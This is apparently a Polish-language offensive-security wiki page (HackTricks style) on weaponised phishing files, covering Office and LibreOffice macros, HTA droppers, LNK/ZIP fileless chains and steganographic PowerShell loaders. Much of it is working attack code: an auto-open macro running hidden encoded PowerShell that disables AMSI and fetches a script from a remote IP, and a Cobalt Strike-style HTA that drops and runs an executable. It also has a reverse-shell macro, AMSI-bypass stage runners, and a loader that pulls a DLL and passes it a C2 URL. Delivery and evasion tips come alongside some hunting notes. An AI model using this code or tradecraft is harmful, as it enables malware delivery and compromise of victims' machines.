# Pliki i dokumenty phishingowe

{{#include ../../banners/hacktricks-training.md}}

## Dokumenty Office

Microsoft Word wykonuje walidację danych pliku przed jego otwarciem. Walidacja danych jest przeprowadzana w formie identyfikacji struktury danych względem standardu OfficeOpenXML. Jeśli podczas identyfikacji struktury danych wystąpi jakikolwiek błąd, analizowany plik nie zostanie otwarty.

Zazwyczaj pliki Word zawierające macros używają rozszerzenia `.docm`. Można jednak zmienić nazwę pliku, zmieniając rozszerzenie, i nadal zachować możliwość wykonywania macros.\
Na przykład plik RTF domyślnie nie obsługuje macros, ale plik DOCM przemianowany na RTF zostanie obsłużony przez Microsoft Word i będzie zdolny do wykonywania macros.\
Te same mechanizmy i elementy wewnętrzne dotyczą całego oprogramowania Microsoft Office Suite (Excel, PowerPoint itd.).

Możesz użyć następującego polecenia, aby sprawdzić, które rozszerzenia będą wykonywane przez niektóre programy Office:
```bash
assoc | findstr /i "word excel powerp"
```
Pliki DOCX odwołujące się do zdalnego szablonu (File –Options –Add-ins –Manage: Templates –Go), który zawiera macros, mogą również „wykonywać” macros.

### Ładowanie zewnętrznego obrazu

Przejdź do: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture oraz **Filename or URL**:_ http://<ip>/whatever

![Office Documents - Ładowanie zewnętrznego obrazu: Przejdź do: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Backdoor macros

Możliwe jest użycie macros do uruchamiania dowolnego kodu z dokumentu.

#### Funkcje automatycznego ładowania

Im są częściej używane, tym większe prawdopodobieństwo, że AV je wykryje.

- AutoOpen()
- Document_Open()

#### Przykłady kodu macros
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ręczne usuwanie metadanych

Przejdź do **File > Info > Inspect Document > Inspect Document**, aby otworzyć Document Inspector. Kliknij **Inspect**, a następnie **Remove All** obok **Document Properties and Personal Information**.

#### Rozszerzenie dokumentu

Po zakończeniu wybierz listę rozwijaną **Save as type** i zmień format z **`.docx`** na Word 97-2003 **`.doc`**.\
Zrób to, ponieważ **nie można zapisywać makr w pliku `.docx`**, a rozszerzenie z włączonymi makrami **`.docm`** jest **stygmatyzowane** **i** (np. ikona miniatury zawiera ogromny znak `!`, a niektóre bramy web/email całkowicie je blokują). Dlatego to **starsze rozszerzenie `.doc` jest najlepszym kompromisem**.

#### Generatory złośliwych makr

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Makra automatycznie uruchamiane w dokumentach LibreOffice ODT (Basic)

Dokumenty LibreOffice Writer mogą zawierać makra Basic i automatycznie je uruchamiać po otwarciu pliku, przypisując makro do zdarzenia **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Proste makro reverse shell wygląda następująco:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Zwróć uwagę na podwójne cudzysłowy (`""`) wewnątrz ciągu — LibreOffice Basic używa ich do ucieczki przed literalnymi cudzysłowami, dlatego payloady kończące się na `...==""")` zachowują równowagę zarówno wewnętrznego polecenia, jak i argumentu Shell.

Wskazówki dotyczące dostarczania:

- Zapisz plik jako `.odt` i przypisz macro do zdarzenia dokumentu, aby uruchamiało się natychmiast po jego otwarciu.
- Podczas wysyłania wiadomości e-mail za pomocą `swaks` użyj `--attach @resume.odt` (`@` jest wymagane, aby jako załącznik zostały wysłane bajty pliku, a nie ciąg znaków zawierający nazwę pliku). Ma to kluczowe znaczenie podczas wykorzystywania serwerów SMTP, które akceptują dowolnych odbiorców `RCPT TO` bez walidacji.

## Pliki HTA

HTA to program Windows, który **łączy HTML i języki skryptowe (takie jak VBScript i JScript)**. Generuje interfejs użytkownika i wykonuje się jako aplikacja z „pełnym zaufaniem”, bez ograniczeń wynikających z modelu bezpieczeństwa przeglądarki.

HTA jest uruchamiany za pomocą **`mshta.exe`**, który jest zazwyczaj **instalowany** razem z **Internet Explorer**, przez co **`mshta` jest zależny od IE**. Jeśli więc zostanie on odinstalowany, HTA nie będzie można uruchomić.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Wymuszanie uwierzytelniania NTLM

Istnieje kilka sposobów na **zdalne wymuszenie uwierzytelniania NTLM**, na przykład można dodać **niewidoczne obrazy** do wiadomości e-mail lub kodu HTML, do którego użytkownik uzyska dostęp (nawet przez HTTP MitM?). Można też wysłać ofierze **adresy plików**, które **wyzwolą** **uwierzytelnianie** już przy **otwieraniu folderu.**

**Sprawdź te pomysły i nie tylko na następujących stronach:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Pamiętaj, że można nie tylko wykraść hash lub dane uwierzytelniające, ale również **przeprowadzać ataki NTLM relay**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Wysoce skuteczne kampanie dostarczają archiwum ZIP zawierające dwa legalne dokumenty-wabiki (PDF/DOCX) oraz złośliwy plik .lnk. Sztuczka polega na tym, że właściwy PowerShell loader jest przechowywany w surowych bajtach archiwum ZIP za unikalnym markerem, a plik .lnk wycina go i uruchamia w całości w pamięci.<sup>[[2]](#references)</sup>

Typowy przebieg zaimplementowany jako jednolinijkowy skrypt PowerShell w pliku .lnk:

1) Znajdź oryginalne archiwum ZIP w typowych lokalizacjach: Desktop, Downloads, Documents, %TEMP%, %ProgramData% oraz w katalogu nadrzędnym bieżącego katalogu roboczego.
2) Odczytaj bajty archiwum ZIP i znajdź hardcoded marker (np. xFIQCV). Wszystko za markerem jest osadzonym PowerShell payloadem.
3) Skopiuj archiwum ZIP do %ProgramData%, wypakuj je w tym miejscu i otwórz dokument-wabik .docx, aby całość wyglądała legalnie.
4) Omiń AMSI dla bieżącego procesu: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Usuń obfuskację z kolejnego etapu (np. usuń wszystkie znaki #) i wykonaj go w pamięci.

Przykładowy szkielet PowerShell do wycięcia i uruchomienia osadzonego etapu:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Uwagi
- Delivery często wykorzystuje subdomeny renomowanych PaaS (np. *.herokuapp.com) i może filtrować payloady (serwować nieszkodliwe pliki ZIP na podstawie IP/UA).
- Kolejny etap często odszyfrowuje shellcode zakodowany w base64/XOR i wykonuje go za pomocą Reflection.Emit + VirtualAlloc, aby zminimalizować artefakty na dysku.

Persistence używane w tym samym łańcuchu
- COM TypeLib hijacking kontrolki Microsoft Web Browser, dzięki czemu IE/Explorer lub dowolna aplikacja osadzająca tę kontrolkę automatycznie ponownie uruchamia payload.<sup>[[2]](#references)[[4]](#references)</sup> Szczegóły i gotowe do użycia polecenia znajdziesz tutaj:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOC
- Pliki ZIP zawierające ciąg markerów ASCII (np. xFIQCV) dołączony do danych archiwum.
- Plik .lnk, który przeszukuje foldery nadrzędne/użytkownika w celu znalezienia pliku ZIP i otwiera dokument-wabik.
- Manipulowanie AMSI za pomocą [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Długotrwałe wątki biznesowe kończące się linkami hostowanymi pod zaufanymi domenami PaaS.

## Staging z wabikiem LNK uruchamianym jako pierwszy → persistence przez scheduled task → side-loading zaufanego CPL

Kolejnym powtarzającym się wzorcem jest **plik `.lnk` podszywający się pod dokument**, który natychmiast otwiera nieszkodliwy wabik, podczas gdy w tle przygotowuje właściwy łańcuch.<sup>[[3]](#references)</sup>

Zaobserwowany przebieg:
1. Skrót **podszywa się pod plik PDF** i wykorzystuje `conhost.exe` lub podobny proxy do uruchomienia obfuskowanego downloadera PowerShell.
2. Fragmenty PowerShell rozdzielają oczywiste tokeny (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), przez co proste detekcje szukające `iwr`, `gci`, `ren`, `cpi` lub `schtasks` nie wykrywają polecenia.
3. Stager najpierw pobiera **dokument-wabik**, otwiera go dla ofiary, a następnie w tle odtwarza złośliwe pliki.
4. Payloady mogą być zapisywane z **losowymi rozszerzeniami**, a następnie przemianowywane przez usunięcie znaków wypełniających, co opóźnia pojawienie się oczywistych artefaktów `.exe` / `.cpl`.
5. Persistence jest ustanawiane za pomocą **zadania zaplanowanego uruchamianego co minutę**, które uruchamia zaufany plik binarny hosta ze ścieżki zapisywalnej przez użytkownika.

Minimalne wskazówki do huntingu wynikające z tego wzorca:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Przydatny układ stagingu do rozpoznania:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` lub `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Dlaczego second stage jest trudny do wykrycia

W case study Rapid7 scheduled task wielokrotnie uruchamiał **`Fondue.exe`** z `C:\Users\Public\`. Ponieważ obok niego umieszczono **`APPWIZ.cpl`**, eksportujący **`RunFODW`**, zaufany binarny plik Microsoft wykonał side-loading atakującego CPL zamiast użyć właściwej kopii systemowej.

CPL następnie:
- Odczytuje blob **AES-256-CBC** z `C:\Windows\Tasks\editor.dat`
- Odszyfrowuje go za pomocą **Windows CNG / `bcrypt.dll`**
- Przydziela pamięć z prawem wykonywania i kopiuje do niej odszyfrowany shellcode
- Wykonuje go pośrednio, przekazując wskaźnik shellcode jako callback dla **`EnumUILanguagesW`**

Ten ostatni etap warto wykrywać osobno: malware często unika bezpośredniego skoku `((void(*)())buf)()` i zamiast tego nadużywa **legitimate callback-taking WinAPI**, aby przekazać sterowanie.

Odszyfrowanym payloadem w tej kampanii był shellcode **Donut**, który następnie w pełni mapował finalny PE w pamięci i patchował **AMSI/WLDP/ETW** w bieżącym procesie przed przekazaniem wykonania. Szczegółowe informacje o side-loadingu i memory-resident post-processing znajdują się tutaj:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktyczne punkty do analizy:
- `.lnk` uruchamiający `powershell.exe` lub `conhost.exe`, a następnie widoczny dokument-wabik.
- Krótkotrwałe downloady do **`C:\Users\Public\`**, po których natychmiast następują zmiany nazw z użyciem nonsensownych rozszerzeń.
- Scheduled tasks o neutralnych nazwach, takich jak `GoogleErrorReport`, uruchamiane z **user-writable directories**.
- Zaufane binaria ładujące pliki **`.cpl` / `.dll`** z tego samego katalogu niesystemowego.
- Bloby tekstowe Base64 zapisywane w **`C:\Windows\Tasks\`**, a następnie odczytywane przez side-loaded module.

## Payloady rozdzielane steganograficznie w obrazach (PowerShell stager)

Nowsze loader chains dostarczają obfuskowany JavaScript/VBS, który dekoduje i uruchamia Base64 PowerShell stager. Ten stager pobiera obraz (często GIF) zawierający zakodowaną w Base64 bibliotekę .NET DLL ukrytą jako zwykły tekst pomiędzy unikalnymi markerami początku i końca. Skrypt wyszukuje te delimitery (przykłady obserwowane w praktyce: «<<sudo_png>> … <<sudo_odt>>>»), wyodrębnia tekst pomiędzy nimi, dekoduje go z Base64 do bajtów, ładuje assembly do pamięci i wywołuje znaną metodę wejściową z URL-em C2.<sup>[[5]](#references)</sup>

Przepływ
- Stage 1: Archived JS/VBS dropper → dekoduje osadzony Base64 → uruchamia PowerShell stager z `-nop -w hidden -ep bypass`.
- Stage 2: PowerShell stager → pobiera obraz, wycina Base64 ograniczony markerami, ładuje bibliotekę .NET DLL do pamięci i wywołuje jej metodę (np. VAI), przekazując URL C2 oraz opcje.
- Stage 3: Loader pobiera finalny payload i zazwyczaj wstrzykuje go za pomocą process hollowing do zaufanego binarnego pliku (najczęściej MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Więcej informacji o process hollowing i trusted utility proxy execution znajduje się tutaj:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Przykład PowerShell do wycięcia DLL z obrazu i wywołania metody .NET w pamięci:

<details>
<summary>Extractor i loader stego payloadu PowerShell</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Uwagi
- Jest to ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Markery różnią się między kampaniami.
- Obejścia AMSI/ETW i desobfuskacja ciągów znaków są często stosowane przed załadowaniem assembly.
- Polowanie: skanuj pobrane obrazy pod kątem znanych delimiterów; identyfikuj PowerShell uzyskujący dostęp do obrazów i natychmiast dekodujący bloby Base64.

Zobacz także narzędzia stego i techniki carvingu:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → staging PowerShell z Base64

Powtarzającym się etapem początkowym jest mały, silnie zaciemniony plik `.js` lub `.vbs` dostarczony w archiwum. Jego jedynym celem jest zdekodowanie osadzonego ciągu Base64 i uruchomienie PowerShell z `-nop -w hidden -ep bypass` w celu zainicjowania kolejnego etapu przez HTTPS.<sup>[[5]](#references)</sup>

Szkielet logiki (abstrakcyjny):
- Odczytaj zawartość własnego pliku
- Zlokalizuj blob Base64 między ciągami śmieciowymi
- Zdekoduj do PowerShell ASCII
- Wykonaj za pomocą `wscript.exe`/`cscript.exe`, wywołując `powershell.exe`

Wskazówki do polowania
- Zarchiwizowane załączniki JS/VBS uruchamiające `powershell.exe` z `-enc`/`FromBase64String` w wierszu poleceń.
- `wscript.exe` uruchamiający `powershell.exe -nop -w hidden` ze ścieżek tymczasowych użytkownika.

## Pliki Windows do kradzieży hashy NTLM

Sprawdź stronę o **miejscach kradzieży poświadczeń NTLM**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [1] [HTB Job – Makro LibreOffice → webshell IIS → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Kampania ZipLine: wyrafinowany atak phishingowy wymierzony w firmy w USA](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: śledzenie tradecraftu Dropping Elephant przez łańcuch loadera stylizowanego na Chiny](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – nowa technika persistence COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – Loader PhantomVAI dostarcza szeroki zakres infostealerów](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
{{#include ../../banners/hacktricks-training.md}}
